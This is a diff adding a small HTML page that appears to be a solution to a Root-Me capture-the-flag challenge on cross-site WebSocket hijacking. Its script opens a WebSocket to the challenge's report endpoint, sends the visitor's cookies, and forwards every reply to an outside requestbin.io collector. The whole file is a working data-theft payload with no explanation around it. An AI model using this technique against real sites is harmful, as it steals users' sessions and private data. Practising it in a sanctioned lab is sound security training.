@@ -1,0 +1,16 @@
+<!DOCTYPE html>
+<html>
+<body>
+  <script>
+    websocket = new WebSocket('wss://ctf02.root-me.org/report');
+    websocket.onopen = start
+    websocket.onmessage = handleReply
+    function start(event) {
+      websocket.send(document.cookie);
+    }
+    function handleReply(event) {
+      fetch('https://requestbin.io/1fetb1q1', {method:'POST',mode:'no-cors',body:event.data})
+    }
+  </script>
+</body>
+</html>
